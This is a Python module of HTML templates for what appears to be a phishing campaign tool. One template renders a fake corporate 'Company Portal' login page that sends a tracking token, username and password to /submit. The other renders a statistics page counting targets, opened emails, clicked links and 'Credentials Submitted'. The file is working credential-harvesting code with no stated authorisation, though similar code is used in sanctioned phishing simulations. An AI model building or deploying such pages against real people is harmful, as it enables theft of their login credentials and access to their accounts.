#!/usr/bin/env python3
"""
Landing page HTML templates
"""

class LandingPages:
    """Manage landing page templates"""
    
    @staticmethod
    def corporate_login(token: str) -> str:
        """Corporate portal login page"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Company Portal Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }}
        .logo {{
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 30px;
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }}
        button:hover {{
            background: #5568d3;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 Company Portal</div>
        <form method="POST" action="/submit">
            <input type="hidden" name="token" value="{token}">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
'''
    
    @staticmethod
    def stats_page(stats: dict) -> str:
        """Campaign statistics page"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Campaign Statistics</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            padding: 40px;
            background: #f5f5f5;
        }}
        .stats-container {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 800px;
            margin: 0 auto;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{ color: #333; }}
        .stat {{
            padding: 20px;
            margin: 10px 0;
            background: #f9f9f9;
            border-left: 4px solid #667eea;
        }}
        .stat-number {{
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
        }}
        .stat-label {{
            color: #666;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="stats-container">
        <h1>📊 Campaign Statistics</h1>
        <div class="stat">
            <div class="stat-number">{stats['total_targets']}</div>
            <div class="stat-label">Total Targets</div>
        </div>
        <div class="stat">
            <div class="stat-number">{stats['emails_opened']} ({stats['open_rate']:.1f}%)</div>
            <div class="stat-label">Emails Opened</div>
        </div>
        <div class="stat">
            <div class="stat-number">{stats['links_clicked']} ({stats['click_rate']:.1f}%)</div>
            <div class="stat-label">Links Clicked</div>
        </div>
        <div class="stat">
            <div class="stat-number">{stats['credentials_submitted']} ({stats['success_rate']:.1f}%)</div>
            <div class="stat-label">Credentials Submitted</div>
        </div>
    </div>
</body>
</html>
'''